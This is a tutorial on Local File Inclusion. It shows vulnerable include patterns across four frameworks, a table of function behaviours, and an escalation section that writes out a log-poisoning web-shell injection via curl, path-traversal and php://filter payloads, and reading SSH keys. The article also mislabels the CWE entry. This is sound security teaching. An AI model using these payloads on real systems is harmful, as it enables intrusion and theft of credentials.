# Local File Inclusion: Foundations

File Inclusion vulnerabilities emerge from a fundamental pattern in web development: using URL parameters to dynamically load content. The vulnerability is not in the pattern itself, but in passing user-controlled values directly into filesystem functions without sanitisation. [OWASP classifies this under CWE-73](https://cwe.mitre.org/data/definitions/73.html) (Improper Control of a Filename for Include/Require), and it is consistently one of the more exploitable input validation failures in web applications.

***

## Where LFI Typically Hides

Templating engines are the most common location because they are built to load different content based on a parameter. A URL like `/index.php?page=about` looks completely benign, but if `about` feeds directly into an `include()` call, an attacker substitutes it with a path to any file the web server process can read. The feature works exactly as intended, which is why it gets missed in routine code review.

Common legitimate-looking parameters that are frequently vulnerable:
- `?page=`, `?file=`, `?template=`
- `?lang=` or `?language=`
- `?view=`, `?section=`, `?module=`
- URL path segments like `/about/en/` where `en` controls a directory or file path

***

## Vulnerable Patterns Across Frameworks

The vulnerability has the same root cause in every language: unsanitised user input flowing into a file-loading function. The functions differ by language but the flaw is identical.

**PHP** is the most commonly affected language. The [PHP documentation](https://www.php.net/manual/en/function.include.php) for `include()` makes no mention of sanitising the path argument, which catches developers off guard:
```php
// Any of these with raw user input is vulnerable
include($_GET['language']);
include_once($_GET['language']);
require($_GET['language']);
require_once($_GET['language']);
file_get_contents($_GET['language']);
fopen($_GET['language'], 'r');
```

**NodeJS** surfaces the same pattern through the native `fs` module and the [Express.js](https://expressjs.com/) `render()` function. The second example is particularly notable because the injection comes from the URL path, not a query string parameter, which scanners sometimes miss:
```javascript
// Injection via query parameter
fs.readFile(path.join(__dirname, req.query.language), function(err, data) {
    res.write(data);
});

// Injection via URL path segment - /about/en or /about/../../etc/passwd
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

**Java (JSP)** exposes the same pattern through both `jsp:include` and the [JSTL](https://docs.oracle.com/javaee/5/jstl/1.1/docs/tlddocs/) `c:import` tag. The `import` tag is more dangerous of the two because it also accepts remote URLs:
```jsp
<jsp:include file="<%= request.getParameter('language') %>" />
<c:import url="<%= request.getParameter('language') %>"/>
```

**.NET** has several functions affected across both [WebForms](https://learn.microsoft.com/en-us/aspnet/web-forms/) and [Razor/MVC](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/razor):
```csharp
Response.WriteFile(HttpContext.Request.Query['language']);
@Html.Partial(HttpContext.Request.Query['language'])
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

***

## Read vs Execute: A Critical Distinction

Not all file inclusion functions behave the same way. Whether a function executes the included file or only reads its contents determines the maximum severity of the vulnerability. This is the most important thing to understand when auditing code, because the exploitation path differs significantly depending on which function is in use.

| Function | Language | Read | Execute | Remote URL |
|----------|----------|:----:|:-------:|:----------:|
| `include()` / `include_once()` | PHP | Yes | Yes | Yes |
| `require()` / `require_once()` | PHP | Yes | Yes | No |
| `file_get_contents()` | PHP | Yes | No | Yes |
| `fopen()` / `file()` | PHP | Yes | No | No |
| `fs.readFile()` / `fs.sendFile()` | NodeJS | Yes | No | No |
| `res.render()` | NodeJS | Yes | Yes | No |
| `include` | Java | Yes | No | No |
| `import` | Java | Yes | Yes | Yes |
| `@Html.Partial()` | .NET | Yes | No | No |
| `@Html.RemotePartial()` | .NET | Yes | No | Yes |
| `Response.WriteFile()` | .NET | Yes | No | No |
| `include` | .NET | Yes | Yes | Yes |

Functions that support remote URLs and execute files are the enablers of [Remote File Inclusion (RFI)](https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/). In PHP specifically, RFI requires `allow_url_include = On` in `php.ini`, which was deprecated in PHP 7.4.0 and is disabled by default in modern installations.  PHP's `allow_url_fopen` is a separate and lower-risk setting that enables URL-aware file opening but does not by itself allow remote inclusion through `include()`. 
***

## Impact Chain: Read-Only to Full RCE

Even functions that only read files should not be underestimated. The escalation path from read-only LFI to remote code execution is well-documented and does not require the ability to upload files directly. The most reliable technique is [log poisoning](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1/):
```
1. Confirm LFI by reading /etc/passwd via traversal
2. Locate the Apache access log at /var/log/apache2/access.log
3. Inject PHP into the log by sending a request with a malicious User-Agent:
   curl -A "<?php system($_GET['cmd']); ?>" http://target.com/
4. The PHP code is now written to the log file unsanitised
5. Include the log file via LFI and pass a system command:
   /index.php?page=../../../../var/log/apache2/access.log&cmd=id
6. RCE achieved
```

PHP wrappers extend this further even without log access. The [php://filter](https://www.php.net/manual/en/wrappers.filters.php) wrapper can read PHP source files without executing them by base64-encoding the output, bypassing the issue where including a PHP file would execute it before you can read it: 

```
/index.php?page=php://filter/convert.base64-encode/resource=config.php
```

The base64 output is decoded locally to reveal the raw PHP source, which frequently contains database credentials, API keys, and hardcoded secrets.

The full impact chain regardless of function type:

```
LFI (read-only)
    |
    v
/etc/passwd              → Username enumeration
Application config       → DB credentials, API keys
Web app source code      → Secondary vulnerability discovery
SSH private keys         → Direct server access (/home/user/.ssh/id_rsa)
    |
    v
Log poisoning / PHP wrappers / Session file injection
    |
    v
Remote Code Execution    → Full back-end server compromise
```

This is why classifying an LFI as "low severity because it only reads files" is a mistake. Read access to the right files is frequently sufficient to escalate to full system compromise through secondary techniques.
